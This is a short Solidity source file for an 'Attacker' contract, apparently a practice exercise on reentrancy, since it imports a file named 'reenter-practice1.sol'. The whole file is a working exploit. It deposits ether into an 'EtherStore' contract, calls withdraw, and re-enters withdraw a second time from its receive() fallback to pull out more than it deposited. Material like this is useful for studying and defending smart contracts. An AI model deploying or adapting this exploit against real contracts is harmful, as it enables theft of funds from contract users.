// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.13;

import "./reenter-practice1.sol";

contract Attacker{

    EtherStore store;
    uint public count;
    uint256 amount;

    constructor(address _store){

        store = EtherStore(_store);

    }

    function attack() public payable{

         amount = msg.value;
        store.deposit{value: amount}();

        store.withdraw(amount);

    }


    receive() external payable{
        if (count ==0){
            count =1;
            store.withdraw(amount);
        }

    }


}
